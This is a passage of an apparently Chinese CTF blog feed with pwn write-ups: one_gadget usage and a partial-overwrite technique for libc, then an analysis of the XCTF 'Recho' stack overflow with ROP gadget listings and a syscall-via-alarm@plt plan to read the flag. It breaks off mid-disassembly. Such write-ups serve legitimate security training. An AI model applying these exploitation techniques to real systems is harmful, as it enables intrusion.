class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  rsp <span class="token operator">&amp;</span> <span class="token number">0xf</span> <span class="token operator">==</span> <span class="token number">0</span>  rcx <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0x4f3c2</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0xe58b8</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp<span class="token number">-0x88</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp<span class="token number">-0x70</span><span class="token punctuation">]</span><span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span><span class="token punctuation">[</span>rbp<span class="token number">-0x88</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> <span class="token punctuation">[</span>rbp<span class="token number">-0x88</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span>  <span class="token punctuation">[</span><span class="token punctuation">[</span>rbp<span class="token number">-0x70</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> <span class="token punctuation">[</span>rbp<span class="token number">-0x70</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0xe58bf</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> r10<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp<span class="token number">-0x70</span><span class="token punctuation">]</span><span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span>r10<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> r10 <span class="token operator">==</span> <span class="token constant">NULL</span>  <span class="token punctuation">[</span><span class="token punctuation">[</span>rbp<span class="token number">-0x70</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> <span class="token punctuation">[</span>rbp<span class="token number">-0x70</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0xe58c3</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> r10<span class="token punctuation">,</span> rdx<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span>r10<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> r10 <span class="token operator">==</span> <span class="token constant">NULL</span>  <span class="token punctuation">[</span>rdx<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> rdx <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0x10a45c</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0x10a468</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsi<span class="token punctuation">,</span> <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span>rsi<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> rsi <span class="token operator">==</span> <span class="token constant">NULL</span>  <span class="token punctuation">[</span><span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> <span class="token punctuation">[</span>rax<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span></code></pre><h3 id="one-gadget—near功能"><a href="#one-gadget—near功能" class="headerlink" title="one_gadget—near功能"></a>one_gadget—near功能</h3><p>指令：one_gadget  libc文件  –near  某函数</p><pre class=" language-c"><code class="language-c">hunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>国赛$ one_gadget libc<span class="token number">-2.27</span><span class="token punctuation">.</span>so  <span class="token operator">--</span>near read<span class="token punctuation">[</span>OneGadget<span class="token punctuation">]</span> Gadgets near <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0x110180</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true">//这是read的偏移</span><span class="token number">0x10a45c</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0x4f3c2</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0x4f365</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  rsp <span class="token operator">&amp;</span> <span class="token number">0xf</span> <span class="token operator">==</span> <span class="token number">0</span>  rcx <span class="token operator">==</span> <span class="token constant">NULL</span></code></pre><p>可以找到靠近某个函数的one_gadget。</p><p>一般libc基地址结尾至少三个000</p><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>国赛$ ldd babymessage    linux<span class="token operator">-</span>vdso<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">1</span> <span class="token punctuation">(</span><span class="token number">0x00007ffc691d1000</span><span class="token punctuation">)</span>         libc<span class="token punctuation">.</span>so<span class="token number">.6</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">6</span> <span class="token punctuation">(</span><span class="token number">0x00007f069fd4d000</span><span class="token punctuation">)</span>    <span class="token operator">&lt;=</span><span class="token operator">==</span>    <span class="token operator">/</span>lib64<span class="token operator">/</span>ld<span class="token operator">-</span>linux<span class="token operator">-</span>x86<span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">2</span> <span class="token punctuation">(</span><span class="token number">0x00007f06a013e000</span><span class="token punctuation">)</span>hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>国赛$ ldd babymessage    linux<span class="token operator">-</span>vdso<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">1</span> <span class="token punctuation">(</span><span class="token number">0x00007ffc22f83000</span><span class="token punctuation">)</span>        libc<span class="token punctuation">.</span>so<span class="token number">.6</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">6</span> <span class="token punctuation">(</span><span class="token number">0x00007f7507911000</span><span class="token punctuation">)</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>    <span class="token operator">/</span>lib64<span class="token operator">/</span>ld<span class="token operator">-</span>linux<span class="token operator">-</span>x86<span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">2</span> <span class="token punctuation">(</span><span class="token number">0x00007f7507d02000</span><span class="token punctuation">)</span>  hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>国赛$ ldd babymessage    linux<span class="token operator">-</span>vdso<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">1</span> <span class="token punctuation">(</span><span class="token number">0x00007ffc4990d000</span><span class="token punctuation">)</span>      libc<span class="token punctuation">.</span>so<span class="token number">.6</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">6</span> <span class="token punctuation">(</span><span class="token number">0x00007f7f439ca000</span><span class="token punctuation">)</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>    <span class="token operator">/</span>lib64<span class="token operator">/</span>ld<span class="token operator">-</span>linux<span class="token operator">-</span>x86<span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">2</span> <span class="token punctuation">(</span><span class="token number">0x00007f7f43dbb000</span><span class="token punctuation">)</span></code></pre><p>例子：<br><img src="https://s1.ax1x.com/2020/08/27/d4DkOH.png" alt=""><br>所以在程序中read函数的真实地址和第一个one_gadget就最后2字节不同。利用这一点我们可以在泄露不了libc的情况下采用尾字节覆盖的方式来强行修改read函数地址成为我们的one_gadget地址</p><p>详情见：<a href="https://bbs.pediy.com/thread-261112.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-261112.htm</a></p>]]></content>
      
      
      <categories>
          
          <category> 比赛复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2020-8月国赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-Recho</title>
      <link href="/2020/08/30/xctf-challenge-recho/"/>
      <url>/2020/08/30/xctf-challenge-recho/</url>
      
        <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ checksec Recho<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/Recho'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    No canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span>基本操作</code></pre><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> nptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-40h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-30h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-8h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+3Ch] [rbp-4h]</span>  <span class="token function">Init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Welcome to Recho server!\n"</span><span class="token punctuation">,</span> <span class="token number">0x19uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nptr<span class="token punctuation">,</span> <span class="token number">0x10uLL</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v7 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span>      v7 <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>    v6 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>    buf<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>init（）：<span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">Init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">0x3Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>程序逻辑：</p><ul><li>输入一定大小的数字</li><li>按输入的数字大小再次读入对应长度的字符串<ul><li>显然这里存在溢出</li></ul></li><li>输出字符串以此</li><li>循环<br>可利用字符串：<pre class=" language-java"><code class="language-java">LOAD<span class="token operator">:</span><span class="token number">0000000000400238</span>    0000001C    C    <span class="token operator">/</span>lib64<span class="token operator">/</span>ld<span class="token operator">-</span>linux<span class="token operator">-</span>x86<span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">.</span>so<span class="token number">.2</span>LOAD<span class="token operator">:</span><span class="token number">00000000004003E9</span>    0000000A    C    libc<span class="token punctuation">.</span>so<span class="token number">.6</span>LOAD<span class="token operator">:</span>00000000004003F3    <span class="token number">00000006</span>    C    stdinLOAD<span class="token operator">:</span>00000000004003F9    <span class="token number">00000007</span>    C    printfLOAD<span class="token operator">:</span><span class="token number">0000000000400400</span>    <span class="token number">00000005</span>    C    readLOAD<span class="token operator">:</span><span class="token number">0000000000400405</span>    <span class="token number">00000007</span>    C    stdoutLOAD<span class="token operator">:</span>000000000040040C    <span class="token number">00000007</span>    C    stderrLOAD<span class="token operator">:</span><span class="token number">0000000000400413</span>    <span class="token number">00000006</span>    C    alarmLOAD<span class="token operator">:</span><span class="token number">0000000000400419</span>    <span class="token number">00000005</span>    C    atoiLOAD<span class="token operator">:</span>000000000040041E    <span class="token number">00000008</span>    C    setvbufLOAD<span class="token operator">:</span><span class="token number">0000000000400426</span>    <span class="token number">00000012</span>    C    __libc_start_mainLOAD<span class="token operator">:</span><span class="token number">0000000000400438</span>    <span class="token number">00000006</span>    C    writeLOAD<span class="token operator">:</span>000000000040043E    <span class="token number">0000000F</span>    C    __gmon_start__LOAD<span class="token operator">:</span><span class="token number">000000000040044D</span>    0000000C    C    GLIBC_2<span class="token number">.2</span><span class="token punctuation">.</span><span class="token number">5</span><span class="token punctuation">.</span>rodata<span class="token operator">:</span>00000000004008C4    0000001A    C    Welcome to Recho server<span class="token operator">!</span>\n<span class="token punctuation">.</span>eh_frame<span class="token operator">:</span><span class="token number">0000000000400987</span>    <span class="token number">00000006</span>    C    <span class="token punctuation">;</span><span class="token operator">*</span><span class="token number">3</span>$\"<span class="token punctuation">.</span>data<span class="token operator">:</span><span class="token number">0000000000601058</span>    <span class="token number">00000005</span>    C    flag</code></pre>没有system，/bin/sh，后门，但是有个flag字符串</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>栈溢出漏洞很明显，但是想利用它来控制程序流程得先想办法如何跳出while循环。</li><li>read函数的返回值时其读入字节的数量（包括换行’\x0a’)，所以这个东西很头疼。但是pwntools提供了一个shutdown功能，可以关闭输入流，也就是说不进行输入那么read的返回值自然就是0了</li><li>但是关闭之后就不能再打开了，就算你再次跳到start或者main。也无法再进行输入</li><li>所以我们的payload只能用一次，而且这一次还要能把flag获取<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2></li><li>注意到可利用字符串中包含flag，我们可以构造open函数打开flag文件 </li><li>再用read函数从flag流中读取数据，最后用printf或者write函数输出 <h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3></li></ul><p><strong>所以现在得想办法进行函数无中生有，且无法利用libc文件。那么这就要用到函数的ROP链构造了，看看gadgets够不够还有关键的int 80h。</strong></p><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ ROPgadget <span class="token operator">--</span>binary Recho <span class="token operator">--</span>only <span class="token string">"pop|ret"</span>Gadgets information<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token number">0x000000000040089c</span> <span class="token operator">:</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret<span class="token number">0x000000000040089e</span> <span class="token operator">:</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret<span class="token number">0x00000000004008a0</span> <span class="token operator">:</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret<span class="token number">0x00000000004008a2</span> <span class="token operator">:</span> pop r15 <span class="token punctuation">;</span> ret<span class="token number">0x00000000004006fc</span> <span class="token operator">:</span> pop rax <span class="token punctuation">;</span> ret   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token number">0x000000000040089b</span> <span class="token operator">:</span> pop rbp <span class="token punctuation">;</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret<span class="token number">0x000000000040089f</span> <span class="token operator">:</span> pop rbp <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret<span class="token number">0x0000000000400690</span> <span class="token operator">:</span> pop rbp <span class="token punctuation">;</span> ret<span class="token number">0x00000000004008a3</span> <span class="token operator">:</span> pop rdi <span class="token punctuation">;</span> ret   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token number">0x00000000004006fe</span> <span class="token operator">:</span> pop rdx <span class="token punctuation">;</span> ret   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token number">0x00000000004008a1</span> <span class="token operator">:</span> pop rsi <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">=</span><span class="token number">0x000000000040089d</span> <span class="token operator">:</span> pop rsp <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret<span class="token number">0x00000000004005b6</span> <span class="token operator">:</span> rethunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ ROPgadget <span class="token operator">--</span>binary Recho <span class="token operator">--</span>only <span class="token string">"int"</span>Gadgets information<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>Unique gadgets found<span class="token operator">:</span> <span class="token number">0</span></code></pre><p>还不错，存放系统调用号的rax，以及三个参数RDI，RSI，RDX都有对应的独立gadgets。但是关键的int 80h却没有，这就很烦~~<br>但是除了int 80h 咱们还有syscall，这个也是系统调用最后进行中断处理的指令和int 80h差不多。并且这个再系统调用中更为常见。比如，在本例我们随便深入一个函数：</p><pre class=" language-java"><code class="language-java"><span class="token number">0x7ffff7af4147</span> <span class="token operator">&lt;</span>__GI___libc_write<span class="token operator">+</span><span class="token number">7</span><span class="token operator">></span><span class="token operator">:</span>    mov    eax<span class="token punctuation">,</span>DWORD PTR <span class="token punctuation">[</span>rax<span class="token punctuation">]</span>   <span class="token number">0x7ffff7af4149</span> <span class="token operator">&lt;</span>__GI___libc_write<span class="token operator">+</span><span class="token number">9</span><span class="token operator">></span><span class="token operator">:</span>    test   eax<span class="token punctuation">,</span>eax<span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x7ffff7af414b</span> <span class="token operator">&lt;</span>__GI___libc_write<span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span><span class="token operator">:</span>        jne    <span class="token number">0x7ffff7af4160</span> <span class="token operator">&lt;</span>__GI___libc_write<span class="token operator">+</span><span class="token number">32</span><span class="token operator">></span>   <span class="token number">0x7ffff7af414d</span> <span class="token operator">&lt;</span>__GI___libc_write<span class="token operator">+</span><span class="token number">13</span><span class="token operator">></span><span class="token operator">:</span>    mov    eax<span class="token punctuation">,</span><span class="token number">0x1</span>   <span class="token number">0x7ffff7af4152</span> <span class="token operator">&lt;</span>__GI___libc_write<span class="token operator">+</span><span class="token number">18</span><span class="token operator">></span><span class="token operator">:</span>    syscall    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>   <span class="token number">0x7ffff7af4154</span> <span class="token operator">&lt;</span>__GI___libc_write<span class="token operator">+</span><span class="token number">20</span><span class="token operator">></span><span class="token operator">:</span>    cmp    rax<span class="token punctuation">,</span><span class="token number">0xfffffffffffff000</span>   <span class="token number">0x7ffff7af415a</span> <span class="token operator">&lt;</span>__GI___libc_write<span class="token operator">+</span><span class="token number">26</span><span class="token operator">></span><span class="token operator">:</span>        ja     <span class="token number">0x7ffff7af41b0</span> <span class="token operator">&lt;</span>__GI___libc_write<span class="token operator">+</span><span class="token number">112</span><span class="token operator">></span></code></pre><p>我们可以看到在libc中要调用write函数时，把write的系统调用号放入eax，然后执行syscll指令，就像int 80h一样。<br>但是如果成功利用了某个函数中的syscall那么程序也会继续执行下去可能会发生意料之外的结果，所以我们要选择作用不是很大的函数如这里有alarm。设置闹钟</p><h3 id="alarm-plt"><a href="#alarm-plt" class="headerlink" title="alarm@plt"></a>alarm@plt</h3><pre class=" language-java"><code class="language-java">   <span class="token number">0x4005e0</span> <span class="token operator">&lt;</span>printf<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200a3a</span><span class="token punctuation">]</span>        # <span class="token number">0x601020</span>   <span class="token number">0x4005e6</span> <span class="token operator">&lt;</span>printf<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x1</span>   <span class="token number">0x4005eb</span> <span class="token operator">&lt;</span>printf<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span><span class="token operator">:</span>    jmp    <span class="token number">0x4005c0</span><span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x4005f0</span> <span class="token operator">&lt;</span>alarm<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200a32</span><span class="token punctuation">]</span>        # <span class="token number">0x601028</span> <span class="token operator">|</span> <span class="token number">0x4005f6</span> <span class="token operator">&lt;</span>alarm<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x2</span> <span class="token operator">|</span> <span class="token number">0x4005fb</span> <span class="token operator">&lt;</span>alarm<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span><span class="token operator">:</span>    jmp    <span class="token number">0x4005c0</span> <span class="token operator">|</span> <span class="token number">0x400600</span> <span class="token operator">&lt;</span>read<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200a2a</span><span class="token punctuation">]</span>        # <span class="token number">0x601030</span> <span class="token operator">|</span> <span class="token number">0x400606</span> <span class="token operator">&lt;</span>read<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x3</span> <span class="token operator">|</span><span class="token operator">-</span><span class="token operator">></span>   <span class="token number">0x4005f6</span> <span class="token operator">&lt;</span>alarm<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x2</span>       <span class="token number">0x4005fb</span> <span class="token operator">&lt;</span>alarm<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span><span class="token operator">:</span>    jmp    <span class="token number">0x4005c0</span>       <span class="token number">0x400600</span> <span class="token operator">&lt;</span>read<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200a2a</span><span class="token punctuation">]</span>        # <span class="token number">0x601030</span>       <span class="token number">0x400606</span> <span class="token operator">&lt;</span>read<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x3</span>                                                                  JUMP is taken<span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token 